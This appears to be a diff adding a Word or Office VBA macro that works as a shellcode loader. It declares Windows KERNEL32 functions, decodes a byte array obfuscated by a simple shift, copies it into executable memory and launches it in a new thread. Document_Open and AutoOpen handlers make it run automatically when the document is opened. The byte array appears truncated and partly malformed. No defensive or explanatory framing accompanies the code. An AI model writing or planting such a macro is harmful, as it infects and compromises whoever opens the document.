@@ -1,0 +1,36 @@
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Sub mymacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As Long
+
+    buf = Array(254, 74, 133, 230, 242, 234, 206, 2, 2, 2, 67, 83, 67, 82, 84, 83, 88, 74, 51, 212, 103, 74, 141, 84, 98, 74, 141, 84, 26, 74, 141, 84, 34, 79, 51, 203, 74, 17, 185, 76, 76, 74, 141, 116, 82, 74, 51, 194, 174, 62, _
+    , 2, 67, 90, 108, 2, 92, 67, 188, 13, 49, 17, 50, 1, 215, 89, 91, 67, 188, 119, 112, 79, 99, 1, 215, 75, 1, 208, 235, 62, 1, 1, 1, 74, 3, 197, 74, 43, 200, 74, 135, 248, 119, 182, 67, 1, 233, 90, 108, 2, _
+    91, 75, 201, 196, 242, 183, 164, 88, 1, 215)
+
+    For i = 0 To UBound(buf)
+        buf(i) = buf(i) - 2
+    Next i
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+
+End Sub
+
+Sub Document_Open()
+    mymacro
+End Sub
+Sub AutoOpen()
+    mymacro
+End Sub
+
